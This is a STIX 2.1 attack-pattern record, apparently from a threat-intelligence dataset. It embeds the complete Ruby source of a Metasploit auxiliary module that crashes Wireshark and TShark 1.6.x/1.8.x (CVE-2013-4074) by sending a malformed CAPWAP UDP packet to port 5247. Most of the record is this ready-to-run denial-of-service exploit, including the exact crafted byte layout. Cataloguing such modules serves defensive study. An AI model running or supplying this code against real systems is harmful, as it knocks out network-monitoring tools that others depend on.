{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27a53721-35d0-4e81-8d04-95407db28526",
    "created": "2024-08-14T16:24:36.567122Z",
    "modified": "2024-08-14T16:24:36.567127Z",
    "name": "Wireshark CAPWAP Dissector DoS",
    "description": " This module injects a malformed UDP packet to crash Wireshark and TShark 1.8.0 to 1.8.7, as well as 1.6.0 to 1.6.15. The vulnerability exists in the CAPWAP dissector which fails to handle a packet correctly when an incorrect length is given.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/wireshark/capwap.rb",
            "external_id": "capwap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4074"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wireshark CAPWAP Dissector DoS',\n      'Description'    => %q{\n        This module injects a malformed UDP packet to crash Wireshark and TShark 1.8.0 to 1.8.7, as well\n        as 1.6.0 to 1.6.15. The vulnerability exists in the CAPWAP dissector which fails to handle a\n        packet correctly when an incorrect length is given.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Laurent Butti', # Discovery vulnerability\n          'j0sm1'  # Auxiliary msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-4074'],\n          ['OSVDB', '94091'],\n          ['BID', '60500']\n        ],\n      'DisclosureDate' => '2014-04-28'))\n\n    # Protocol capwap needs port 5247 to trigger the dissector in wireshark\n    register_options([ Opt::RPORT(5247) ])\n  end\n\n  def run\n\n    connect_udp\n\n    # We send a packet incomplete to crash dissector\n    print_status(\"#{rhost}:#{rport} - Trying to crash wireshark capwap dissector ...\")\n    # With 0x90 in this location we set to 1 the flags F and M. The others flags are sets to 0, then\n    # the dissector crash\n    # You can see more information here: https://www.rfc-editor.org/rfc/rfc5415.txt\n    # F = 1 ; L = 0 ; W = 0 ; M = 1 ; K = 0 ; Flags = 000\n    buf = Rex::Text.rand_text(3) + \"\\x90\" + Rex::Text.rand_text(15)\n    udp_sock.put(buf)\n\n    disconnect_udp\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-28"
}